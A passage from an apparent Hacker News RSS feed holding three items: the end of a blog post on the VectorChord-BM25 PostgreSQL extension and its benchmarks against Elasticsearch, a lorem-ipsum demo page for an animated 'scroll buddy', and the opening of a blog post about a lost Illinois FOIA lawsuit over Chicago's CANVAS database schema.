<pre><code><span>-- Setup the document table</span>
<span>CREATE</span> <span>TABLE</span> documents (
    <span>id</span> <span>SERIAL</span> PRIMARY <span>KEY</span>,
    passage <span>TEXT</span>,
    embedding bm25vector
);

<span>INSERT</span> <span>INTO</span> documents (passage) <span>VALUES</span>
(<span>'PostgreSQL is a powerful, open-source object-relational database system. It has over 15 years of active development.'</span>),
(<span>'Full-text search is a technique for searching in plain-text documents or textual database fields. PostgreSQL supports this with tsvector.'</span>),
...
(<span>'Effective search ranking algorithms, such as BM25, improve search results by understanding relevance.'</span>);
</code></pre>
<p>Then tokenize it</p>
<pre><code><span>UPDATE</span> documents <span>SET</span> embedding = tokenize(passage, <span>'Bert'</span>);
</code></pre>
<p>Create the index on the bm25vector column so that we can collect the global document frequency.</p>
<pre><code><span>CREATE</span> <span>INDEX</span> documents_embedding_bm25 <span>ON</span> documents <span>USING</span> bm25 (embedding bm25_ops);
</code></pre>
<p>Now we can compute the BM25 score between the query and the vectors. It’s worth noting that the BM25 score is negative—this is by design. A higher (less negative) score indicates a more relevant document. We intentionally made the score negative so that you can use the default <code>ORDER BY</code> clause to easily retrieve the most relevant documents first.</p>
<pre><code><span>SELECT</span> <span>id</span>, passage, embedding &lt;&amp;&gt; to_bm25query(<span>'documents_embedding_bm25'</span>, <span>'PostgreSQL'</span>, <span>'Bert'</span>) <span>AS</span> <span>rank</span>
<span>FROM</span> documents
<span>ORDER</span> <span>BY</span> <span>rank</span>
<span>LIMIT</span> <span>10</span>;
</code></pre>
<h3 id="heading-other-tokenizers">Other Tokenizers</h3>
<p>In addition to BERT, VectorChord-BM25 also supports <code>Tocken</code> and <code>Unicode</code> Tokenizers. <code>Tocken</code> is a Unicode tokenizer pre-trained on the <code>wiki-103-raw</code> dataset with a minimum frequency (<code>min_freq</code>) of 10. Since it’s a pre-trained tokenizer, you can use it similarly to BERT.</p>
<pre><code><span>SELECT</span> tokenize(<span>'A quick brown fox jumps over the lazy dog.'</span>, <span>'Tocken'</span>);
</code></pre>
<p><code>Unicode</code> is a tokenizer that builds a vocabulary list from your data, similar to the standard behavior in Elasticsearch and other full-text search engines. To enable this, you need to create a specific one for your data using <code>create_unicode_tokenizer_and_trigger(vocab_list_name, table_name, source_text_column, tokenized_vec_column)</code>.</p>
<pre><code><span>CREATE</span> <span>TABLE</span> documents (<span>id</span> <span>SERIAL</span>, <span>text</span> <span>TEXT</span>, embedding bm25vector);
<span>SELECT</span> create_unicode_tokenizer_and_trigger(<span>'test_token'</span>, <span>'documents'</span>, <span>'text'</span>, <span>'embedding'</span>);

<span>INSERT</span> <span>INTO</span> documents (<span>text</span>) <span>VALUES</span> (<span>'PostgreSQL is a powerful, open-source object-relational database system.'</span>);
<span>CREATE</span> <span>INDEX</span> documents_embedding_bm25 <span>ON</span> documents <span>USING</span> bm25 (embedding bm25_ops);
<span>SELECT</span> <span>id</span>, <span>text</span>, embedding &lt;&amp;&gt; to_bm25query(<span>'documents_embedding_bm25'</span>, <span>'PostgreSQL'</span>, <span>'test_token'</span>) <span>AS</span> <span>rank</span>
    <span>FROM</span> documents
    <span>ORDER</span> <span>BY</span> <span>rank</span>
    <span>LIMIT</span> <span>10</span>;
</code></pre>
<p>Please check out the <a target="_blank" href="https://github.com/tensorchord/VectorChord-bm25/blob/main/tokenizer.md">tokenizer documentation</a> if you want to know more about it.</p>
<h2 id="heading-faster-than-elasticsearch-really">Faster than ElasticSearch (Really?)</h2>
<p><img data-zoomable="true" loading="lazy" src="https://i.imgflip.com/6b4xz9.jpg" alt="math Memes &amp; GIFs - Imgflip"></p>
<p>To ensure our new plugin provides meaningful and relevant results—not just faster performance—we rigorously evaluated VectorChord-BM25 using <a target="_blank" href="https://github.com/xhluca/bm25-benchmarks">bm25-benchmarks</a>. We leveraged the widely recognized BEIR benchmark for information retrieval, focusing on two key metrics: <strong>QPS (Queries Per Second)</strong> to measure speed and <strong>NDCG@10 (Normalized Discounted Cumulative Gain at 10)</strong> to assess relevance and ranking accuracy.</p>
<p>In our initial version, we were thrilled to see our system achieve <strong>3-5 times higher QPS</strong> compared to ElasticSearch. However, we also noticed that on certain datasets, our NDCG@10 scores were significantly lower than ElasticSearch’s. After a thorough analysis, we realized these gaps weren’t caused by our indexing implementation but rather by differences in tokenization approaches.</p>
<p>To address this, we invested considerable effort to align our tokenization process with ElasticSearch’s, ensuring a more accurate and fair comparison.</p>
<h3 id="heading-issue-1-stopword-list">Issue 1: Stopword List</h3>
<div data-node-type="callout">
<p>💡</p>
<p>A <strong>stopword</strong> is a common word filtered out during text processing because it adds little meaning—for example, words like "the," "is," and "at."</p>
</div>

<p>ElasticSearch defaults to using Lucene’s Standard Tokenizer, which relies on a relatively short stopword list. In contrast, our initial implementation utilized NLTK’s much more comprehensive stopword list. As a result, ElasticSearch’s searches include certain stopwords, leading to longer inverted index lists that require additional scanning time—ultimately impacting performance.</p>
<h3 id="heading-issue-2-stemming">Issue 2: Stemming</h3>
<div data-node-type="callout">
<p>💡</p>
<p>A <strong>stemmer</strong> reduces words to their base form, "running" and "ran" both become "run."</p>
</div>

<p>We initially used the <strong>snowball stemmer</strong> from the rust-stemmer library to handle word variations, but we observed discrepancies compared to ElasticSearch’s implementation. Upon investigation, we discovered that the rust-stemmer’s version of snowball was outdated. Following the guidelines from the official snowball repository, we regenerated the files using the latest version.</p>
<p>When we aligned both the <strong>stopword list</strong> and <strong>stemmer</strong> between our system and ElasticSearch, our performance advantage decreased from <strong>300% to 40%</strong>. Even so, on three datasets—nq, fever, and climate-fever—a noticeable performance gap persisted. A deeper comparison revealed a subtle but critical detail: in the bm25-benchmark, ElasticSearch preprocesses data differently from other frameworks, which contributed to the remaining discrepancy.</p>
<h3 id="heading-issue-3-data-preprocessing">Issue 3: Data Preprocessing</h3>
<p>In the BEIR dataset, each document includes both a title and a text field. While most frameworks concatenate these fields into a single string for indexing, ElasticSearch accepts JSON input and indexes the title and text separately. During querying, ElasticSearch performs a multi_match operation, searching both fields independently and combining their scores (using the higher score plus 0.5 times the lower score). This approach yields significantly better NDCG@10 results but requires searching two separate indexes, which can substantially impact performance.</p>
<p>To ensure a fair comparison, we re-ran our ElasticSearch tests by concatenating the title and text fields. With this adjustment, VectorChord-BM25 was able to match ElasticSearch’s results. Interestingly, ElasticSearch’s <strong>QPS (geometric mean)</strong> increased from <strong>135 to 341</strong> when using concatenated fields, making it <strong>25% faster</strong> than VectorChord-BM25’s <strong>271.91 QPS</strong> in Top10 query tests. However, in Top1000 tests, VectorChord-BM25 achieved a QPS of <strong>112</strong> compared to ElasticSearch’s <strong>49</strong>—making our implementation <strong>2.26 times faster</strong>.</p>
<p>This experience highlights the challenges of conducting fair performance comparisons between different BM25 full-text search implementations. The <strong>tokenizer</strong> is an exceptionally complex and influential component, and ElasticSearch’s intricate default settings add another layer of complexity to the evaluation process.</p>
<h2 id="heading-future">Future</h2>
<p>We’re still in the early stages of this project, and we’ve already pinpointed several areas for performance optimization. Tokenization is an inherently complex process—even for English, we face numerous decisions and trade-offs. Our next step is to <strong>fully decouple the tokenization process</strong>, transforming it into an independent and extensible extension. This will enable us to support multiple languages, allow users to customize tokenization for better results, and even incorporate advanced features like synonym handling.</p>
<p>Our ultimate goal is to empower users to perform <strong>high-quality, relevance-based full-text searches</strong> on PostgreSQL with ease. Combined with <a target="_blank" href="https://github.com/tensorchord/VectorChord/"><strong>VectorChord</strong></a>, we aim to deliver a <strong>first-class data infrastructure for RAG (Retrieval-Augmented Generation)</strong>. After all, choosing PostgreSQL is always a solid decision!</p>
<p>If you have any questions about vector search or full-text search in PostgreSQL, feel free to reach out to us! You can connect with us at:</p>
<ul>
<li><p>Discord: <a target="_blank" href="https://discord.gg/KqswhpVgdU">https://discord.gg/KqswhpVgdU</a></p>
</li>
<li><p>Email: <a target="_blank" href="mailto:vectorchord-inquery@tensorchord.ai">vectorchord-inquery@tensorchord.ai</a></p>
</li>
</ul>


<h2 id="heading-more-benchmarks">More Benchmarks</h2>
<p>In addition to the Top1000 benchmarks, we have also conducted extensive evaluations for Top10 results. These benchmarks provide further insights into the performance of our implementation across different datasets. If you’re interested in exploring these results in detail, feel free to refer to the data provided here.</p>
<p><img data-zoomable="true" loading="lazy" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1740190947932/67305460-724d-4dc5-aa7f-606a6ceb13cb.png?auto=compress,format&amp;format=webp" alt=""></p>
<p><img data-zoomable="true" loading="lazy" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1740190965658/ca72272a-49af-43f8-87b7-16d14b383e8a.png?auto=compress,format&amp;format=webp" alt=""></p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Made a scroll bar buddy that walks down the page when you scroll (581 pts)]]></title>
            <link>https://focusfurnace.com/scroll_buddy.html</link>
            <guid>43237581</guid>
            <pubDate>Mon, 03 Mar 2025 02:13:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://focusfurnace.com/scroll_buddy.html">https://focusfurnace.com/scroll_buddy.html</a>, See on <a href="https://news.ycombinator.com/item?id=43237581">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <h2>( Look at your scroll bar when you scroll )</h2>
            
            <div><p>Instead of a boring scrollbar thought it would be fun to have an animated stick figure that walks up and down the side of your page when you scroll.
    
               </p><p>This is the first prototype i made. </p><p>Going to make a skateboarder, rock climber, or squirrel next. what other kinds of scroll buddies should I make?

</p></div>


            <h2><a href="https://forms.gle/L8QNEELnyAwXyBsD8">Get a scroll buddy for your website</a></h2>
            <p>Warning: An embedded example on the side of this page has an animation / movement that may be problematic for some readers. Readers with vestibular motion disorders may wish to enable the reduce motion feature on their device before viewing the animation. If you have reduce motion settings turned on Scroll Buddy should be hidden on most browsers.</p>
        
            <p>ignore all the text below its just lorem ipsum to have content for scrolling.<br>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>

            
            <h2>Heading 2</h2>
            <p>Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <h2>Heading 2</h2>

            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>

            <h2>Made with simple javascript</h2>
            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>

            <p>At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident.</p>

            <h2>Heading 2</h2>
            <p>Similique sunt in culpa qui officia deserunt mollitia animi, id est laborum et dolorum fuga. Et harum quidem rerum facilis est et expedita distinctio. Nam libero tempore, cum soluta nobis est eligendi optio cumque nihil impedit.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>

            <p>Temporibus autem quibusdam et aut officiis debitis aut rerum necessitatibus saepe eveniet ut et voluptates repudiandae sint et molestiae non recusandae. Itaque earum rerum hic tenetur a sapiente delectus.</p>

            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>
            <h2>Heading 2</h2>

            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            <h2>Heading 2</h2>

            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>

            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>

            <h2>Heading 2</h2>
            <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>

            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
            
            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>
            <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
                        <h2>Heading 2</h2>

            <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem.</p>

            <p>Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Losing a 5-year-long Illinois FOIA lawsuit for database schemas (130 pts)]]></title>
            <link>https://mchap.io/losing-a-5yr-long-illinois-foia-lawsuit-for-database-schemas.html</link>
            <guid>43237352</guid>
            <pubDate>Mon, 03 Mar 2025 01:30:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mchap.io/losing-a-5yr-long-illinois-foia-lawsuit-for-database-schemas.html">https://mchap.io/losing-a-5yr-long-illinois-foia-lawsuit-for-database-schemas.html</a>, See on <a href="https://news.ycombinator.com/item?id=43237352">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="divbodyholder">
<h3><a href="https://mchap.io/losing-a-5yr-long-illinois-foia-lawsuit-for-database-schemas.html">
<h3>Losing a 5-year-long Illinois FOIA lawsuit for database schemas</h3>
</a></h3>
<!-- bashblog_timestamp: #202502261828.52# -->
<p>March 2, 2025 — 
Matt Chapman
</p>
<!-- text begin -->
<!-- fun begin -->

<p>Thomas Ptacek, a friend and expert witness in this lawsuit summed it up best in the court's hallway while walking within three feet of opposing counsel: <em>"This is fucking stupid"</em>.</p>

<p>His <a href="https://sockpuppet.org/blog/2025/02/09/fixing-illinois-foia/">companion post</a> explains why.</p>

<h2>Intro</h2>

<p>Working with the City of Chicago's parking ticket data—which I've<a href="https://mchap.io/using-foia-data-and-unix-to-halve-major-source-of-parking-tickets.html"> received through FOIA</a>—has always been a pain, especially in terms of knowing what exactly to request. In August 2018, I attempted to generally solve that problem, by submitting a request for the following:</p>

<pre><code><em>An index of the tables and columns within each table of CANVAS.
Please include the column data type as well.

Per the <a href="https://www.chicago.gov/content/dam/city/depts/dps/ContractAdministration/Specs/2011/Spec92488II.pdf">CANVAS specification</a>, the database in question is Oracle, 
so the below SQL query will likely yield the records pursuant to this request:

select utc.column_name as colname, uo.object_name as tablename, utc.data_type as type
from user_objects uo
join user_tab_columns utc on uo.object_name = utc.table_name
where uo.object_type = 'TABLE'
</em></code></pre>

<p>—<a href="https://www.muckrock.com/foi/chicago-169/canvas-database-schema-60175/"><i>CANVAS Database Schema request on Muckrock</i></a></p>

<p>After the City initially denied the request with an argument that the records' release would compromise network security, I took the denial to court where we initially won at-trial. The City then appealed, which we won as well. The case ultimately went up to the Illinois Supreme Court, where we lost unanimously. Better Government Association did a <a href="https://www.bettergov.org/2023/05/19/better-government-association-statement-supreme-court-foia-ruling-limits-transparency-significantly-broadens-exemptions-to-foia/">good explainer </a>of the consequences of that loss, which boils down to a significant broadening of public agencies' leeway to apply exemptions (i.e., withhold records or redact information) in response to FOIA requests. </p>

<h2>Why Go Through All of This?</h2>

<p>Under Illinois FOIA case law, if a request's responsive documents—the set of records or information within the scope of that request—are stored in a queryable database, a query must be written. The requester is not required to write the query. The law even requires the agency to give you the data in a format of your choice (protip: "excel format"). When it works, it's freaking great. Reality makes it difficult for a number of reasons, though:</p>

<ul>
<li>The FOIA officer will likely need to defer any querying to a colleague who is a "data person."</li>
<li>You can't just ask a question:<a href="https://www.documentcloud.org/documents/?q=%22does+not+compel+the+agency+to+provide%22">"FOIA does not compel the agency to provide answers to questions posed by the inquirer."</a></li>
<li>From the requester's perspective, "Is X column requestable?" isn't answerable without first attempting to request that column's data.</li>
<li>Requesting too many columns will likely lead to time-consuming back-and-forth, or a flat-out denial.</li>
<li>Even though Illinois FOIA requires that a requester be given a chance to narrow their request, FOIA officers sometimes just stop responding during this "conferral" process.</li>
</ul>

<p>To generally work through this problem, many folk will spend hours surfing through PDFs, reports, contracts, work products, etc, just to get a sense of what data might exist. This process is frustrating and often yields incomplete results.  Let's walk through my attempt with CANVAS.

</p><h2>First Attempts for Parking Ticket Data</h2>

<p>My <em><a href="https://www.documentcloud.org/documents/25548155-first-foia/">very first</a></em> FOIA request was pretty narrow and sought the City's towing data. The City was unable to get me what I requested for reasons I can't seem to find, but it painted a picture that the Chicago doesn't <em>really</em> track how cars are towed. </p>

<p>A month later, the project began shifting towards parking ticket data in addition to towing data, so I <a href="https://www.documentcloud.org/documents/25546093-1029-001/">requested:</a></p> 

<pre><code><em>all raw towing and parking violation records available in the CANVAS system and any records that are from imported/interpolated from non-CANVAS systems.</em></code></pre> 

<p>This request was denied. The Department of Finance argued that the request would take anywhere between 280 to 400 hours to complete:</p>

<pre><code><em>There are 55 million ticket records and 928K seizure records in CANVAS. As far as tow information, we only have knowledge of when a vehicle is towed due to a boot and released. The Department of Finance's application support vender estimates a minimum of 60-80 hours to design/develop/test and run the program.

In addition, since this is like a conversion to another system, we are not sure how long it would take to transfer so much data, a rough estimate would be an additional 80-120 hours to design a solution to get all the data on some kind of media for retrieval. Compliance with this request as currently written would take approximately 140-200 hours utilizing our vendor's resources to the exclusion of other work assignments.</em></code></pre>

<p>A couple months and some phone calls later, I submitted a narrower request, which was successfully fulfilled, because I included an explicit list of fields. After honing the request language a <a href="https://www.documentcloud.org/documents/25548154-foia-request-data/">a bit more</a>, I was eventually able to get the data used in the analysis of my <a href="https://mchap.io/using-foia-data-and-unix-to-halve-major-source-of-parking-tickets.html">first blog post.</a></p>

<h2> But Wait, Is There More?</h2>


<p>Despite getting the limited information I had requested, I still wanted to expand my analysis, which required knowing what other information exists within CANVAS. So, I submitted <a href="https://www.documentcloud.org/documents/25546081-matt-chapman-canvas-information-foia-response-1/">another request</a> for high-level and low-level system information: 

</p><pre><code><em>
1. Code for CANVAS
2. Logs of CANVAS and/or CANVAS log analysis. 
3. Documentation for the operation of CANVAS, including how information is stored, what kind of database is used, along with any other technical documentation or generic documentation.
4. Any Wiki page related to CANVAS.
5. Any analysis of City parking ticket levels or trends.</em></code></pre><p>

The only records the City sent in response was a <a href="https://www.documentcloud.org/documents/25546082-matt-chapman-canvas-information-foia-document-1/">lackluster spreadsheet</a> with just 100 rows, broken down by ward. I'm still not sure if this was the only analysis <i>ever</i> done at the time, but let's get back to the meat of this blog post.

</p><p>1, 2, and 3 were denied because:

</p><pre><code><em>[The records] could be used in a security breach against CANVAS and jeopardize the security of the system, therefore it is being withheld.</em></code></pre>

<p>But with the goal of just figuring out what information exists, the request was extremely wide and could have been narrowed to something more akin to a <a href="https://en.wikipedia.org/wiki/Data_dictionary">"data dictionary"</a>. To this day, I've never been able to get anything like a data dictionary from the City, though there <i>is</i> a contractual obligation—<a href="https://data.cityofchicago.org/Administration-Finance/CANVAS/sbf2-65yk/data_preview">as described in the RFP spec for this $200 million system</a>—for the City to maintain something like that! But alas, at least in 2018, <a href="https://www.rpubs.com/argdata/420073">the City claimed</a> they don't have anything like it. 


</p><center><img src="https://mchap.io/assets/maintaindatamodels.png" alt="https://www.documentcloud.org/documents/25537825-document/#document/p180/a2624483" title=""><br></center>

<center><em>—Professional Services Agreement Between the City of Chicago Department of Finance and Department of Administrative Hearings and IBM Corporation: City of Chicago Violation, Noticing and Adjudication Business Process and System Support, p. 180 (2012)</em></center>

<h2>Requesting Database Records from All City Databases</h2>

<p>Sensing a pattern of a general failure to maintain data dictionaries, <a href="https://www.chicago.gov/city/en/depts/mayor/press_room/press_releases/2013/october_2013/mayor_rahm_emanuelandthedepartmentofinnovationandtechnologylaunc.html">despite the City's public support for launching one</a>, I submitted a FOIA request to every City agency for the following: 

</p><pre><code><em>1. A short description of the database.
2. The names of the applications that are able to run queries/inserts.
3. All usernames and permissions
4. All database table names.
5. All column names in each table.
6. A description of each column.
7. Number of rows in each table.</em></code></pre>

<p>A couple weeks later, Chicago's Department of Law sent me <a href="https://www.documentcloud.org/documents/25546087-database-foia-request-021315/">a letter on behalf of every agency</a> and denied all parts, 1 through 7, of that request. 

</p><p>First, they argued that they would need to "create a new document":</p>
<pre><code><em>First, no City Department is in possession of a document which contains the information you seek. The only way to compile the requested information, to the extent it is not exempt for one or more of the reasons noted below, would be to create a document.</em></code></pre>

<p>Then, they requested a pedantic clarification about what "database" means:</p>
<pre><code><em>Your request does not provide a definition of the term database. A commonly accepted definition of "database" is collection of pieces of information that is organized and used on a computer. http://www.merriam-webster.com/dictionary/database. Such a broad definition would include Excel spreadsheets. It would be unduly burdensome to the operations of each of the City's Departments to search every computer in use by its personnel in order to identify, open,review and catalogue each database and every Excel spreadsheet in the manner you request."</em></code></pre><p>

But even with all of that, they offered a helpful suggestion, and pointed to the City's "data dictionary":

</p><pre><code><em>Please note that in late 2013, the City of Chicago launched a publically available Data Dictionary which can be found at http://datadictionary.cityofchicago.org/. It is described as “a resource for anyone who is interested in understanding what data is held by City agencies and departments, how and if it may be accessed, and in what formats it may be accessed.”</em></code></pre><p>

Cool! It's a damn shame the system shutdown less than a year later, though.

</p><h2>"Metalicious": Chicago's Failed Data Dictionary</h2>
<p>A lot of government agencies have absolutely recognized the problem of the public not knowing what information exists, including Chicago. One such attempt at fixing this problem is to voluntarily make the columns and table names of their databases open to the public, like the Department of Justice's <a href="https://www.justice.gov/afp/media/1186431/dl?inline=">PDFs of table names, column names, and descriptions of both.</a>. There's even an <a href="https://resources.data.gov/">open specification</a> for government database schemas!</p><p>But even with agencies voluntarily making schema information public, such releases are effectively discretionary and are outside of the realm of FOIA.</p>

<p>One such release of discretionary information, as the Department of Law mentioned in their denial letter, is the 2013-released city-wide data dictionary project called "Metalicious". That's the actual name.</p>

<p>Metalicious was funded by a $300,000 John D. and Catherine T. MacArthur Foundation grant to UChicago's Chapin Hall, with the intended purpose of making table names, column names and descriptions of both publicly accessible. It's the City's "data dictionary".

</p><center><p><img src="https://mchap.io/assets/internet_archive_metalicious.png" alt="CANVAS!" title=""></p>

<em>Schema information of the Chicago Budget System on Metalicious (2016)</em></center>

